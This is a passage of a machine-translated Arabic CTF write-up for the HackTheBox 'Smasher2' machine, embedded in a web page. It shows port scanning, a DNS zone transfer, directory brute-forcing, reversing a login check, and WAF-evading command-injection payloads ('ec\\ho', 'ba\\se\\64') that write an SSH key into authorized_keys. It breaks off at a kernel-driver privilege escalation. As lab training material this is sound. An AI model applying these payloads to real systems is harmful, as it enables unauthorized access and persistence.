<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>โ๐ผ ๐ ๐ ูุงู ุฐุง ุจููุณ โโ- Smasher2 ุชุฌูู ูุงุฑูุฑุฉ ุ WAF ู LPE ุนุจุฑ ุงูุณุงุฆููู pwn ๐จ๐ผ ๐ค ๐ด</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ูู ูุฐู ุงูููุงูุฉ ุ ุณุฃุจุฏุฃ ูู ูุดุฑ ุญููู ุชู ุฅุฑุณุงููุง ููุฒูุฏ ูู ุงููุนุงูุฌุฉ ูู ูููุน HackTheBox . ุขูู ุฃู ูุณุงุนุฏ ุฐูู ุดุฎุตูุง ุนูู ุงูุฃูู ุนูู ุงูุชุทูุฑ ูู ูุฌุงู ุฃูู ุงููุนูููุงุช...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ูุงู ุฐุง ุจููุณ โโ- Smasher2 ุชุฌูู ูุงุฑูุฑุฉ ุ WAF ู LPE ุนุจุฑ ุงูุณุงุฆููู pwn</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/480454/" style=";text-align:right;direction:rtl"><div style="text-align:center;;text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ms/yw/0j/msyw0jxgua25iuntaxj1qcayfuq.png" alt="ุตูุฑุฉ"></div><br>  ูู ูุฐู ุงูููุงูุฉ ุ ุณุฃุจุฏุฃ ูู ูุดุฑ ุญููู ุชู ุฅุฑุณุงููุง <a href="https://www.hackthebox.eu/" rel="nofollow">ููุฒูุฏ</a> ูู <a href="https://www.hackthebox.eu/" rel="nofollow">ุงููุนุงูุฌุฉ</a> ูู ูููุน <a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a> .  ุขูู ุฃู ูุณุงุนุฏ ุฐูู ุดุฎุตูุง ุนูู ุงูุฃูู ุนูู ุงูุชุทูุฑ ูู ูุฌุงู ุฃูู ุงููุนูููุงุช.  ูู ูุฐู ุงูููุงูุฉ ุณูููู ุจุนูุณ ููุชุจุฉ python ูุชุฌุงูุฒ WAF ูุงุณุชุบูุงู ุซุบุฑุฉ mmap. <br><br>  ุงูุงุชุตุงู ุจุงููุฎุชุจุฑ ุนุจุฑ VPN.  ููุตู ุจุนุฏู ุงูุงุชุตุงู ูู ููุจููุชุฑ ูุนูู ุฃู ูู ูุถูู ุญูุซ ุชุชููุฑ ุงูุจูุงูุงุช ุงููููุฉ ุจุงููุณุจุฉ ูู ุ ุญูุซ ููุชูู ุจู ุงููุทุงู ุนูู ุดุจูุฉ ุฎุงุตุฉ ูุน ุฃุดุฎุงุต ูุนุฑููู ุดูุฆูุง ูู ูุฌุงู ุฃูุงู ุงููุนูููุงุช :) <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงููุนูููุงุช ุงูุชูุธูููุฉ</b> <div class="spoiler_text" style=";text-align:right;direction:rtl">  ุฎุงุตุฉู ูุฃููุฆู ุงูุฐูู ูุฑุบุจูู ูู ุชุนูู ุดูุก ุฌุฏูุฏ ูุชุทููุฑู ูู ุฃู ูู ูุฌุงูุงุช ุฃูู ุงููุนูููุงุช ูุงูุญุงุณูุจ ุ ุณุฃูุชุจ ูุฃุชุญุฏุซ ุนู ุงููุฆุงุช ุงูุชุงููุฉ: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  PWN. </li><li style=";text-align:right;direction:rtl">  ุงูุชุดููุฑ (ุงูุชุดููุฑ) ุ </li><li style=";text-align:right;direction:rtl">  ุชูููุงุช ุงูุดุจูุงุช (ุงูุดุจูุฉ) ุ </li><li style=";text-align:right;direction:rtl">  ุนูุณ (ุงูููุฏุณุฉ ุงูุนูุณูุฉ) ุ </li><li style=";text-align:right;direction:rtl">  ุฅุฎูุงุก ุงููุนูููุงุช (Stegano) ุ </li><li style=";text-align:right;direction:rtl">  ุจุญุซ ูุงุณุชุบูุงู ููุงุทู ุงูุถุนู WEB. </li></ul><br>  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ุณูู ุฃุดุงุฑู ุชุฌุฑุจุชู ูู ุงูุทุจ ุงูุดุฑุนู ููููุจููุชุฑ ุ ูุชุญููู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ูุงูุจุฑุงูุฌ ุงูุซุงุจุชุฉ ุ ูุงููุฌูุงุช ุนูู ุงูุดุจูุงุช ุงููุงุณูููุฉ ูุดุจูุงุช ุงูููุงุทู ุงููุญููุฉ ุ ูุฅุฌุฑุงุก ุนูููุงุช pentests ูุงุณุชุบูุงู ุงููุชุงุจุฉ. <br><a name="habracut"></a><br>  ุญุชู ุชุชููู ูู ูุนุฑูุฉ ุงูููุงูุงุช ุงูุฌุฏูุฏุฉ ูุงูุจุฑุงูุฌ ูุงููุนูููุงุช ุงูุฃุฎุฑู ุ ุฃูุดุฃุช <a href="https://t.me/RalfHackerChannel" rel="nofollow">ููุงุฉ ูู Telegram</a> <a href="https://t.me/RalfHackerPublicChat" rel="nofollow">ููุฌููุนุฉ ูููุงูุดุฉ ุฃู ูุดุงูู</a> ูู ูุฌุงู ุงูุชุตููู ุงูุฏููู ููุฃูุฑุงุถ.  ุฃูุถูุง ุ ุณุฃุฏุฑุณ ุดุฎุตููุง ุทูุจุงุชู ุงูุดุฎุตูุฉ ูุฃุณุฆูุชู ูุงูุชุฑุงุญุงุชู ูุชูุตูุงุชู <a href="https://t.me/hackerralf8" rel="nofollow">ุดุฎุตููุง ูุณุฃุฌูุจ ุนูู ุงูุฌููุน</a> . <br><br>  ูุชู ุชูููุฑ ุฌููุน ุงููุนูููุงุช ููุฃุบุฑุงุถ ุงูุชุนููููุฉ ููุท.  ูุง ูุชุญูู ูุคูู ูุฐุง ุงููุณุชูุฏ ุฃูุฉ ูุณุคูููุฉ ุนู ุฃู ุถุฑุฑ ููุญู ุจุดุฎุต ูุง ูุชูุฌุฉ ุงุณุชุฎุฏุงู ุงููุนุฑูุฉ ูุงูุฃุณุงููุจ ุงูุชู ุชู ุงูุญุตูู ุนูููุง ูุชูุฌุฉ ูุฏุฑุงุณุฉ ูุฐุง ุงููุณุชูุฏ. <br></div></div><br><h2 style=";text-align:right;direction:rtl">  ุงุณุชูุดุงู </h2><br><h3 style=";text-align:right;direction:rtl">  ูููุงุก ุงููุณุญ ุงูุถูุฆู </h3><br>  ูุญุชูู ูุฐุง ุงูุฌูุงุฒ ุนูู ุนููุงู IP ูุฏุฑู 10.10.10.135 ุ ุฃููู ุจุฅุถุงูุชู ุฅูู / etc / hosts. <br> <code>10.10.10.135 smasher2.htb</code> <br>  ุฃููุงู ุ ูููู ุจูุณุญ ุงูููุงูุฐ ุงูููุชูุญุฉ.  ูุธุฑูุง ูุฃู ุงูุฃูุฑ ูุณุชุบุฑู ููุชูุง ุทูููุงู ููุณุญ ุฌููุน ุงูููุงูุฐ ุจุงุณุชุฎุฏุงู nmap ุ ูุณุฃูุนู ุฐูู ุฃููุงู ุจุงุณุชุฎุฏุงู masscan.  ูุญู ูููู ุจูุญุต ุฌููุน ููุงูุฐ TCP ู UDP ูู ูุงุฌูุฉ tun0 ุจุณุฑุนุฉ 1000 ุญุฒูุฉ ูู ุงูุซุงููุฉ. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.135 --rate=1000</code> </pre> <br><img src="https://habrastorage.org/webt/ua/l0/kl/ual0klllexxrrkhyehygavfrji8.png" alt="ุตูุฑุฉ"><br><br>  ุงููุถูู ูุฏูู 3 ููุงูุฐ ููุชูุญุฉ.  ุงูุขู ูู ุจูุณุญู ุถูุฆููุง ุจุงุณุชุฎุฏุงู nmap ููุญุตูู ุนูู ูุฒูุฏ ูู ุงูุชูุงุตูู. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">nmap -A 10.10.10.135 -p22,53,80</code> </pre> <br><img src="https://habrastorage.org/webt/rv/21/y3/rv21y3ntl_dol3qnlgvdhvshdhg.png" alt="ุตูุฑุฉ"><br><br>  ูุจุงูุชุงูู ูุฏููุง SSH ู DNS ู WEB ุ ูุงูุชู ุชูุฑุฌุน ุฑูุฒ 403 (ูุญุธูุฑ ุ ุชู ุฑูุถ ุงููุตูู). <br><br><h3 style=";text-align:right;direction:rtl">  DNS </h3><br>  ุฏุนููุง ุงูุชุญูู ูู DNS.  ููููุงู ุจุฐูู ุ ุงุณุชุฎุฏู ุงูุนููู ุงููุถูู ุ ูุน ุงูุฎูุงุฑ -l ุ ูุงุณุชุฎุฏุงู ุทูุจ AXFR ูุฑุคูุฉ ูุงุฆูุฉ ุจุฌููุน ุงููุถูููู ูู ุงููุฌุงู. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">host -l smasher2.htb 10.10.10.135</code> </pre> <br><img src="https://habrastorage.org/webt/3q/st/te/3qstteuzgycf6fxuc_7vxit1rfe.png" alt="ุตูุฑุฉ"><br><br>  ูุฐูู ุ ุชุญุชุงุฌ ุฅูู ุฅุถุงูุฉ ุฅุฏุฎุงู ุฌุฏูุฏ ูู / etc / hosts. <br> <code>10.10.10.135 wonderfulsessionmanager.smasher2.htb</code> <br> <br><h3 style=";text-align:right;direction:rtl">  WEB </h3><br>  ุงูุขู ุฏุนูุง ููุชูู ููุฑู ูุง ุงูุฐู ุณูู ููุฏูู ููุง WEB ุนูุฏ ุงููุตูู ุฅูู smasher2.htb. <br><br><img src="https://habrastorage.org/webt/9-/li/n5/9-lin58jouqm966oevnsoccso1a.png" alt="ุตูุฑุฉ"><br><br>  ุฅูู ูุงุฑุบ.  ูู ูุฐู ุงูุญุงูุฉ ุ ูุฌุจ ุนููู ูุฑุฒ ุงูุฏูุงุฆู.  ุฃูุง ุฃุณุชุฎุฏู golang ููุชูุจ gobuster ุณุฑูุน.  ุณูููู ุจูุฑุฒ ุงูุฏูุงุฆู ูู 128 ููุถูุนูุง ุ ูุณูููู ููุชููู ุจุชูุณููุงุช html ู php ู txt ูููุญูุงุช conf ูุฑููุฒ ุงูุงุณุชุฌุงุจุฉ 200 ู 204 ู 301 ู 302 ู 307 ู 401. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">gobuster dir -t 128 -u http://smasher2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,conf -s 200,204,301,302,307,401</code> </pre><br><img src="https://habrastorage.org/webt/iw/du/g9/iwdug9gy9ukr37s9nn4-c7pqojk.png" alt="ุตูุฑุฉ"><br><br>  ุงุจุญุซ ุนู ุฏููู ุงููุณุฎ ุงูุงุญุชูุงุทู.  ูุญู ููุธุฑ ุฅูู ูุง ูู ููู. <br><br><img src="https://habrastorage.org/webt/id/lj/zz/idljzzfub_qbnzzwu2x1lic2l38.png" alt="ุตูุฑุฉ"><br><br>  ูุชูุฌุฉ ูุฐูู ุ ูู ุจุชูุฒูู ููู ูููุชุจุฉ ุจุงูุซูู.  ุจุนุฏ ุฐูู ุ ุงูุชูู ุฅูู ุงุณู ูุฌุงู ุขุฎุฑ ุ ูููุงู ูุฌุฏ ูููุฐุฌ ุงูุชูููุถ. <br><br><img src="https://habrastorage.org/webt/mu/n0/mp/mun0mpgaqduxfzmhxifnqbq6_gg.png" alt="ุตูุฑุฉ"><br><br>  ูููู ุงูุจุฑูุงูุฌ ุงููุณุงุนุฏ Mozilla Firefox Wappalyzer ุจุงูุฅุจูุงุบ ุนู ุงูุชูููุงุช ุงููุณุชุฎุฏูุฉ.  ูููุฐุง ุ ูู ููุชูุจ ูู ูููุน ุจูุซูู 2.7.15. <br><br><img src="https://habrastorage.org/webt/ze/h9/ze/zeh9zeby2o839yeim2osz0-w__i.png" alt="ุตูุฑุฉ"><br><br><h2 style=";text-align:right;direction:rtl">  WEB API </h2><br><h3 style=";text-align:right;direction:rtl">  ุงูุซุนุจุงู </h3><br>  ููุฏ ูุฌุฏูุง ููู auth.py ุ ุฏุนูุง ูุญููู.  ูู ุงูุณุทุฑ ุงูุฃูู ูู ุงูุงุณุชูุฑุงุฏ ุ ููุชูู ุฅูู ุงููุญุฏุฉ ุงูููุทูุฉ ses.so ุ ูุงูุชู ูุฌุฏูุงูุง ุฃูุถูุง ูู ุงููุณุฎ ุงูุงุญุชูุงุทูุฉ. <br><br><img src="https://habrastorage.org/webt/8-/ap/rm/8-aprmznzxtkkd04fzy9wzzrchk.png" alt="ุตูุฑุฉ"><br><br>  ูุฌุฏ ุงููุตุงุฏูุฉ ูู ุงูุฑูุฒ.  ูู ุญุงูุฉ ุงููุตุงุฏูุฉ ุงููุงุฌุญุฉ ุ ุณูู ูุนูุฏ secret_token_info. <br><br><img src="https://habrastorage.org/webt/vn/er/sa/vnersai2zkkcopwujarn-9abz8i.png" alt="ุตูุฑุฉ"><br><br><img src="https://habrastorage.org/webt/j2/yp/3e/j2yp3emp8fwuj4xbshedsf7bou0.png" alt="ุตูุฑุฉ"><br><br>  ุฏุนูุง ูุฐูุจ ุฅูู ููุทุฉ "/ api // job".  ูุชู ุงุณุชูุงู ุงูุจูุงูุงุช ุจูุงุณุทุฉ ุทุฑููุฉ POST ุ ุจูููุง ูุฌุจ ุฃู ุชููู ุจุชูุณูู JSON.  ุฅุฐุง ูุงูุช ูุนููุฉ ุงูุฌุฏูู ููุฌูุฏุฉ ูู ุงูุจูุงูุงุช ุ ูุชู ุชูุฑูุฑูุง ุฅูู ุงูุชูููุฐ ูุฃูุฑ ูู ุณุทุฑ ุงูุฃูุงูุฑ. <br><br><img src="https://habrastorage.org/webt/x7/oh/fs/x7ohfsjrcxhr8-tuwqdtcsnjxq8.png" alt="ุตูุฑุฉ"><br><br>  ุชู ุชุนุฏูู ุชุณุฌูู ุงูุฏุฎูู ููููุฉ ุงููุฑูุฑ ... ุชู ูููููุง ุฅูู ููุชุจุชูุง ุ ููุง ููุดุฆ ุฌูุณุฉ - ูุงุฆู SessionManager. <br><br><img src="https://habrastorage.org/webt/uq/p4/2e/uqp42eqln2alvsfnpwyvjbe5c_q.png" alt="ุตูุฑุฉ"><br><br>  ุณูุชู ุงุณุชุฏุนุงุก ูุธููุฉ safe_init_manager (id) ูู ูู ููุงููุฉ ุฌุฏูุฏุฉ ุ ูุฐูู ุจุณุจุจ before_request.  ูุจุงูุชุงูู ุ ุชุชู ุชููุฆุฉ ุฌูุณุฉ ุฌุฏูุฏุฉ. <br><br><img src="https://habrastorage.org/webt/95/wv/yu/95wvyudl1crmjq5nv-bq-li7gze.png" alt="ุตูุฑุฉ"><br><br>  ุชูุดุฆ ุงูุฏุงูุฉ login () ูุงุฆู ูุฏูุฑ ูุนุชูุฏ ุนูู ุงูุฌูุณุฉ. <br><br><img src="https://habrastorage.org/webt/zi/0t/uh/zi0tuhqdy8ewibq3purmsr6u5_e.png" alt="ุตูุฑุฉ"><br><br>  ูุชู ุฅุฌุฑุงุก ุงูุชุญูู ุจูุงุณุทุฉ ุทุฑููุฉ check_login (). <br><br><img src="https://habrastorage.org/webt/u8/xt/_v/u8xt_vgcczwhkl4cbqlzov7tsio.png" alt="ุตูุฑุฉ"><br><br><h3 style=";text-align:right;direction:rtl">  ุนูุณ </h3><br>  ูุฐูู ูุญู ุจุญุงุฌุฉ ููุนุฑูุฉ ููู ูุชู ูุญุต ุงูุจูุงูุงุช.  ููููุงู ุจุฐูู ุ ูู ุงูููุชุจุฉ ูุญุชุงุฌ ุฅูู ููู ุฌูุงุฒ SessionManager.check_login ().  ุฑูู ูู IDA Pro ุ ุงุจุญุซ ุนู ุงููุธููุฉ ุงููุทููุจุฉ. <br><br><img src="https://habrastorage.org/webt/ui/--/y0/ui--y0og5qsjhymyhpozz6kux0u.png" alt="ุตูุฑุฉ"><br><br>  ูุชุญ ุงููุธููุฉ ุ ูููุช ุงูุงูุชุจุงู ุฅูู ุงูุฑุณู ุงูุจูุงูู ููุง.  ููุช ููุชููุง ุจุนุฏุฏ ูู ุงููุชู ุงูุณูููุฉ ุ ูุจู ุงูุชูุงุฑุจ. <br><br><img src="https://habrastorage.org/webt/89/1o/7r/891o7r5jjpip6zh2uqba7xzbgrs.png" alt="ุตูุฑุฉ"><br><br>  ุจุงููุธุฑ ุฅูู ุงููุชู ุ ููููู ูุนุฑูุฉ ูุง ูุชุญุฏุซ ุนูู ูุฐุง ุงููุฑุน ุฃู ุฐุงู ูู ุชูููุฐ ุงููุธููุฉ.  ูุจุงูุชุงูู ุ ูุญู ุจุญุงุฌุฉ ููุท ูุชูุฉ ุฃูุตู ุงููููู. <br><br><img src="https://habrastorage.org/webt/ve/xq/da/vexqdaz61fubdsfteffkqdx0ngi.png" alt="ุตูุฑุฉ"><br><br>  ููุฏ ุฑุณูุช ุฎุท ุณููู ุงููุธููุฉ ุงูุชู ุชูููุง. <br><br><img src="https://habrastorage.org/webt/9c/k9/ao/9ck9aomluu0wemswvub1salylas.png" alt="ุตูุฑุฉ"><br><br>  ุงูุขู ุฏุนูุง ูุฐูุจ ููุฑู ูุงุฐุง ุณูุญุฏุซ.  ูู ููุงู ูุงุญุฏ ุ ูุงุญุธุช ุฑูุฒูุง ูุชุทุงุจููุง ูุชุณุฌูู ุงูุฏุฎูู ููููุฉ ุงููุฑูุฑ.  ููุฐูู ููุณ ุงูููุงุฑูุฉ. <br><br><img src="https://habrastorage.org/webt/65/fs/cd/65fscdprft3krxphyiwtbxdq_vg.png" alt="ุตูุฑุฉ"><br><br>  ุนูุงูุฉ ุนูู ุฐูู ุ ูุชู ุงุณุชุฏุนุงุก ููุณ ุงููุธููุฉ ูุชุณุฌูู ุงูุฏุฎูู ููููุฉ ุงููุฑูุฑ. <br><br><img src="https://habrastorage.org/webt/jo/um/w3/joumw3woscffqrof2lnjlyajdqs.png" alt="ุตูุฑุฉ"><br><br>  ูุฐุง ูุดูุฑ ุฅูู ุฃู ุงุณู ุงููุณุชุฎุฏู ููููุฉ ุงููุฑูุฑ ูุชุดุงุจูุฉ.  ูููู ูุธุฑูุง ูุฃู ูุฐู ุงููููุฉ ุชุฃุชู ุฅูู ุจุฑูุงูุฌ python ูุชู ุชุญุฑูุฑู ุ ูุจูู ููุท ูููุฑุฒ.  ุฌุฑุจุช ุงูุงุณู ุงูููุงุณู ุ ููุฏูุดุชู ุ ุฌุงุก ุงููุณุคูู (ููุงุฐุง ูู ุฃุญุงูู ุนูู ุงูููุฑ ...). <br><br><img src="https://habrastorage.org/webt/xp/9n/at/xp9natep2ikm8wlduicpijksqug.png" alt="ุตูุฑุฉ"><br><br><h2 style=";text-align:right;direction:rtl">  ููุทุฉ ุงูุฏุฎูู </h2><br>  ูุฏููุง ููุชุงุญ.  ุงูุขู ุชุญุชุงุฌ ุฅูู ุฌูุน ุงูุทูุจ ูุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ.  ููุง ุฐูุฑูุง ุณุงุจููุง ุ ูุฌุจ ุฃู ูุฑุณู ุจูุงูุงุช ุทุฑููุฉ POST ุงูุชู ุชุญุชูู ุนูู ูุนููุฉ ุงูุฌุฏูู ุงูุฒููู ุจุชูุณูู JSON ุฅูู <a href="http://wonderfulsessionmanager.smasher2.htb/auth/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job" rel="nofollow">wonderfulsessionmanager.smasher2.htb / auth / fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8 / job</a> .  ูุญู ููุนู ูุฐุง ูุน ุญูููุฉ ุ ูุชูุฑูุฑ ุงููุชูุฌุฉ ุฅูู jq.  ุณูููู ุจุชูููุฐ ุฃูุฑ whoami. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">curl -s -H <span class="hljs-string"><span class="hljs-string">"Cookie: session=eyJpZCI6eyIgYiI6Ik5UaGlZVEJrTmpBMk1qYzBNemN4TmprellUTm1NREV3TXprMk9USTRPV1UzTnpVd05EQXdZZz09In19.XfZcLA.R3UTUnieAARkHBTbqpTmofKWtBw"</span></span> -H <span class="hljs-string"><span class="hljs-string">"Content-Type: application/json"</span></span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="hljs-string"><span class="hljs-string">'{"schedule":"whoami"}'</span></span> | jq</code> </pre> <br><img src="https://habrastorage.org/webt/-s/u0/er/-su0erve1bo3frizq-_qmtlyclq.png" alt="ุตูุฑุฉ"><br><br>  ููู ุนูุฏ ูุญุงููุฉ ุชูููุฐ ุงูุฃูุฑ "ls" ุ ุญุตููุง ุนูู ุฎุทุฃ. <br><br><img src="https://habrastorage.org/webt/sz/c7/pk/szc7pkucef1xd5errhnrw01ydas.png" alt="ุตูุฑุฉ"><br><br>  ุนูู ุงูุฃุฑุฌุญ ููุงู ูุฑุดุญ ูู ุงููุฑูู.  ุฏุนูุง ูุฑุณู "l \\ s" - ุจูุฌุงุญ ุ ููุง ูุฏู ุนูู ูุฌูุฏ ูุฑุดุญ. <br><br><img src="https://habrastorage.org/webt/bx/vl/wy/bxvlwyxbspsgt_bsucpjk8gkdda.png" alt="ุตูุฑุฉ"><br><br><h2 style=";text-align:right;direction:rtl">  USER </h2><br>  ุงูุขู ูุญู ุจุญุงุฌุฉ ุฅูู ุงูุญุตูู ุนูู ูุฐููุฉ ุทุจูุนูุฉ ูู ุงููุธุงู.  ูููู ุงููุธุงู ุจุชุดุบูู SSH ุ ุญุชู ูุชููู ูู ุฅูุดุงุก ููุชุงุญ ูุฏูุนู ุฅูู ูุงุฆูุฉ ุงููุถูููู ุงููุนุชูุฏูู. <br><br>  ุฃููุงู ูููุฏ ููุชุงุญูุง. <br><br><img src="https://habrastorage.org/webt/75/nx/-m/75nx-mr9ckmrkoyiwer3tte6qbm.png" alt="ุตูุฑุฉ"><br><br>  ูุญู ุงูุขู ุจุญุงุฌุฉ ุฅูู ููู ุงูููุชุงุญ ุงูุนุงู ูุฏููุง ุฅูู ุงูููู / home /dzonerzy/.ssh/authorized_keys.  ูููู ูุชุณููู ุงูููู ุ ุณูุณุชุฎุฏู ุงูุชุฑููุฒ ูู base64. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">base64 -w0 id_rsa.pub</code> </pre> <br>  ูููููุง ุฃููุงู ุฅูู ููู ูุคูุช. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">ec\\ho \โ=\โ &gt; /tmp/ralf</code> </pre> <br>  ูู ุดูุฑุฉ ุงูุขู ูุงููุชุงุจุฉ ุนูู ุงููุญู ุงูููุดูุฏ. <br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">ba\\se\\64 -\\d /tmp/ralf &gt;&gt; /home/dzonerzy/\\.\\ss\\h/auth\\orized_ke\\ys</code> </pre> <br>  ููุฏ ูููุง ุจุชุฏููู ุงูููุชุงุญ ุ ูุงูุขู ุฅุฐุง ูุงู ูู ุดูุก ุนูู ูุง ูุฑุงู ุ ูููููุง ุงูุงุชุตุงู ุนุจุฑ SSH ุจุงุณุชุฎุฏุงู ุงูููุชุงุญ ุงูุฎุงุต.  ูุญู ูุญุงูู.  ููุญู ูู ุงููุธุงู. <br><br><img src="https://habrastorage.org/webt/mf/7t/7n/mf7t7nnau3dbshpiirvblygdrhk.png" alt="ุตูุฑุฉ"><br><br><h2 style=";text-align:right;direction:rtl">  LPE - ุงูุฌุฐุฑ </h2><br><h3 style=";text-align:right;direction:rtl">  ุชุนุฏุงุฏ </h3><br>  ุจุฌุงูุจ ุฑูุฒ ุงููุณุชุฎุฏู ูููู ููู README.  ุงูุฑุฃูุง. <br><br><img src="https://habrastorage.org/webt/n0/io/bi/n0iobindnitc1h69lhemnrnskmw.png" alt="ุตูุฑุฉ"><br><br>  ููู ููุง ุฃูู ูุง ููุจุบู ููุง ุฃู ูููุฑ ุจุทุฑููุฉ ูุนูุงุฑูุฉ ... ูููู ุจุนุฏ ุงูุงูุชูุงุก ูู ุงูุชุนุฏุงุฏุงุช ุงูููุงุณูุฉ ูุงูุนุซูุฑ ุนูู ุฃู ุดูุก ุ ููุชุช ุงูุงูุชุจุงู ุฅูู ุงููุฌููุนุฉ ุงูุชู ูููู ุงููุณุชุฎุฏู ูููุง. <br><br><img src="https://habrastorage.org/webt/ko/rc/9u/korc9u_5ji78nds_jgcnelql_uq.png" alt="ุตูุฑุฉ"><br><br>  ูุฌููุนุฉ adm ูุฏููุง ุญู ุงููุตูู ุฅูู ุงููููุงุช ุงููุซูุฑุฉ ููุงูุชูุงู. <br><br><img src="https://habrastorage.org/webt/dp/oj/c0/dpojc0lhn1tpdzsgcp0k11vtyec.png" alt="ุตูุฑุฉ"><br><br>  ุนูู ุณุจูู ุงููุซุงู ุ auth.log.  ูุง ูุนูุณ ููุท ุญูุงุฆู ุงูุชูููุถ ุงููุงุฌุญ ูุบูุฑ ุงููุงุฌุญ ุ ูููู ุฃูุถูุง ุญูุงุฆู ุงุณุชุฎุฏุงู ุงูุฃูุฑ sudo. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">strings /var/<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>/auth.log | grep sudo</code> </pre> <br><img src="https://habrastorage.org/webt/8t/a6/r7/8ta6r7a-rgji8-ruimkshuc-2to.png" alt="ุตูุฑุฉ"><br><br>  ูุชู ุชูููุฐ ุฃูุฑ ูุซูุฑ ููุงูุชูุงู ููุงุจุฉ ุนู ุงูุฌุฐุฑ.  ููููู ูุชุตู ูุน ุจุฑูุงูุฌ ุงูุชุดุบูู ุ ูุฐูู ุนููู ุงูุชุฃูุฏ ูู ุงุชุจุงุน ุงููุณุงุฑ ุฃู ูุง. <br><br><img src="https://habrastorage.org/webt/ix/1i/gx/ix1igxiggwoaugz01xkwu81ftbe.png" alt="ุตูุฑุฉ"><br><br>  ูุนู ุ ูุณูุก ุงูุญุธ ุ ูู ุดูุก ูุฐูุจ ุฅูู ุงูุณุงุฆู. <br><br><h3 style=";text-align:right;direction:rtl">  ุณุงุฆู </h3><br>  ูุธุฑูุง ูุฃู ูุฐุง ุจุฑูุงูุฌ ุชุดุบูู (ูุญุฏุฉ kernel) ุ ูุณูู ูุญุตู ุนูู ูุนูููุงุช ุญูู ุฐูู ุจุงุณุชุฎุฏุงู modinfo. <br><br><img src="https://habrastorage.org/webt/ek/bh/1v/ekbh1vr8tpqrjysaqtkuu3ogwsk.png" alt="ุตูุฑุฉ"><br><br>  ููุงู ุฅู ุงูุณุงุฆู ูุทููุจ ููุนูู ูุน ุฌูุงุฒ ุงูุฐูุฏ.  ุงูุชุญูู ูู ุฐูู. <br><br><img src="https://habrastorage.org/webt/ck/bv/zx/ckbvzxss6iz1ughsn_lhqflutw4.png" alt="ุตูุฑุฉ"><br><br>  ูุนู.  ููุงู ูุซู ูุฐุง ุงูุฌูุงุฒ.  ูุฏุฑุงุณุฉ ุจุฑูุงูุฌ ุงูุชุดุบูู ุ ููุช ุจูุณุฎู ุจููุณู ูููุช ุจุชูุฒููู ูู IDA Pro. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">scp -i id_rsa dzonerzy@10.10.10.135:/lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko ./</code> </pre> <br>  ูุงุฆูุฉ ูุฒููุฉ ูู ุงููุธุงุฆู ุ ูููุง PWN ุ ูุญู ููุชููู ุจุงููุธุงุฆู ุงูุชู ุชุนูู ูุน ุงูุฐุงูุฑุฉ.  ุงุฐุง ุญูููุง ูู ุฎูุงู ุงูุฃุณูุงุก ุ ูุฐู ูู dev_read ู dev_mmap. <br><br><img src="https://habrastorage.org/webt/g9/k9/5s/g9k95slhxhlihqi0nhwm3ei5qxk.png" alt="ุตูุฑุฉ"><br><br>  ูุฒูุฏ ูู googling ุ ูู ุฃุฌุฏ ุจุดูู ุฎุงุต ูุนูููุงุช ุญูู ูุดููุฉ ุนุฏู ุงูุญุตุงูุฉ ูู ุจุฑุงูุฌ ุงูุชุดุบูู ุงููุชุนููุฉ ุจุงููุฑุงุกุฉ ุ ูุงูุชู ูุง ูููู ููููุง ุนู mmap!  ูุฐูู ุฐูุจุช 